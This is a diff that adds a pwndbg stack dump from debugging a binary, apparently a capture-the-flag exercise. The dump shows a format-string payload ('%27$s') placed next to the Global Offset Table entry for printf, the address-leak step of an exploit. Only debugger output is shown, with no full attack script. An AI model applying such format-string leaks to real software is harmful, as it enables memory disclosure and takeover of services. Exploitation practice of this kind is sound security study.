@@ -1,0 +1,27 @@
+pwndbg> stack 30
+00:0000│ rsp            0x7fffe9753730 —▸ 0x7fffe9753770 ◂— 0xa313131 /* '111\n' */
+01:0008│                0x7fffe9753738 —▸ 0x7fffe9753790 ◂— '++%27$s+H `'
+02:0010│                0x7fffe9753740 ◂— 0x0
+03:0018│                0x7fffe9753748 ◂— 0x7f9800000004
+04:0020│                0x7fffe9753750 ◂— 0x0
+... ↓
+06:0030│ rbp            0x7fffe9753760 —▸ 0x7fffe97538a0 —▸ 0x7fffe97538c0 —▸ 0x400f30 (__libc_csu_init) ◂— push   r15
+07:0038│                0x7fffe9753768 —▸ 0x400e4d (secure_service+173) ◂— jmp    0x400e83
+08:0040│                0x7fffe9753770 ◂— 0xa313131 /* '111\n' */
+09:0048│                0x7fffe9753778 ◂— 0x0
+0a:0050│                0x7fffe9753780 ◂— 0x2f2f2f2f2f2f2f2f ('////////')
+... ↓
+0c:0060│ rax rdx rdi-1  0x7fffe9753790 ◂— '++%27$s+H `'
+0d:0068│                0x7fffe9753798 —▸ 0x602048 (_GLOBAL_OFFSET_TABLE_+72) —▸ 0x7f98ca736160 (printf) ◂— sub    rsp, 0xd8
+0e:0070│                0x7fffe97537a0 ◂— 0xa /* '\n' */
+0f:0078│                0x7fffe97537a8 ◂— 0xff000000000000
+10:0080│                0x7fffe97537b0 ◂— 0x6567006574696e69 /* 'inite' */
+11:0088│                0x7fffe97537b8 ◂— 'tpriorit'
+12:0090│                0x7fffe97537c0 ◂— 0x0
+... ↓
+18:00c0│                0x7fffe97537f0 —▸ 0x7fffe97d9268 ◂— add    byte ptr ss:[rax], al /* '6' */
+19:00c8│                0x7fffe97537f8 —▸ 0x7f98cacab708 —▸ 0x7fffe97d9000 ◂— jg     0x7fffe97d9047
+1a:00d0│                0x7fffe9753800 ◂— 0x0
+1b:00d8│                0x7fffe9753808 —▸ 0x7f98caa81600 (_IO_2_1_stdout_) ◂— 0xfbad2887
+1c:00e0│                0x7fffe9753810 ◂— 0xa73 /* 's\n' */
+1d:00e8│                0x7fffe9753818 —▸ 0x7f98ca75bdb2 (_IO_default_setbuf+66) ◂— cmp    eax,
